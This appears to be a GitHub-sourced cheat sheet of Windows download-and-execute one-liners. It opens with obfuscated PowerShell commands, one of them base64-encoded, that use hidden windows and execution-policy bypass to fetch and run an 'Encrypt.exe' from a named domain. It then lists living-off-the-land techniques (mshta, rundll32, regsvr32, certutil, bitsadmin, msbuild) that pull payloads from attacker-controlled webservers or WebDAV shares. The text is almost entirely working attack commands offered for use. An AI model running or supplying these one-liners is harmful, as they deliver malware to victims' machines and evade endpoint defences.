powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://www.ukks.net/controls/Encrypt.exe',"$env:APPDATA\Encrypt.exe");Start-Process ("$env:APPDATA\ps.exe")


## Version1
c:\Windows\System32\cmd.exe /c powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://www.ukks.net/controls/Encrypt.exe')"


## Version2
c:\windows\system32\cmd.exe /c PowErsHelL.EXE -eXecUtiONPoLICy bYPass -NOPROfilE -WinDoWSTYlE hiDden -EnCodeDcOmmAnd KE5ldy1PYkplQ1Qgc1lzdEVtLm5lVC53ZWJDbElFTlQpLkRPV25sb2FkRklsZSgnaHR0cDovL3d3dy51a2tzLm5ldC9jb250cm9scy9FbmNyeXB0LmV4ZScsIiRlbnY6QVBQREFUQVxFbmNyeXB0LmV4ZSIp

powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C "(New-Object Net.WebClient).DownloadString('http://www.ukks.net/controls/Encrypt.exe')

(New-Object Net.WebClient).DownloadString('http://www.ukks.net/controls/Encrypt.exe')

certutil.exe -urlcache -split -f 'http://www.ukks.net/controls/Encrypt.exe'

(New-Object IO.StreamReader([Net.HttpWebRequest]::Create('http://www.ukks.net/controls/Encrypt.exe').GetResponse().GetResponseStream())).ReadToEnd()

(Invoke-WebRequest -Uri 'http://www.ukks.net/controls/Encrypt.exe' -OutFile Encrypt.exe)|iex

bitsadmin /transfer mydownloadjob /download /priority normal http://www.ukks.net/controls/Encrypt.exe C:\\Users\\$env:username\\AppData\\local\\temp\\Encrypt.exe

iwr('http://www.ukks.net/controls/Encrypt.exe')|iex

Windows - Download and execute methods
Downloaded files location
C:\Users<username>\AppData\Local\Microsoft\Windows\Temporary Internet Files\
C:\Users<username>\AppData\Local\Microsoft\Windows\INetCache\IE<subdir>
C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV
Powershell
From an HTTP server

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
From a Webdav server

powershell -exec bypass -f \\webdavserver\folder\payload.ps1
Cmd
cmd.exe /k < \\webdavserver\folder\batchfile.txt
Cscript / Wscript
cscript //E:jscript \\webdavserver\folder\payload.txt
Mshta
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
mshta http://webserver/payload.hta
mshta \\webdavserver\folder\payload.hta
Rundll32
rundll32 \\webdavserver\folder\payload.dll,entrypoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
Regasm / Regsvc @subTee
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
Regsvr32 @subTee
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
Odbcconf
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
Msbuild
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
Certutil
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
Bitsadmin
bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
References
arno0x0x - Windows oneliners to download remote payload and execute arbitrary code
© 2020 GitHub, Inc.
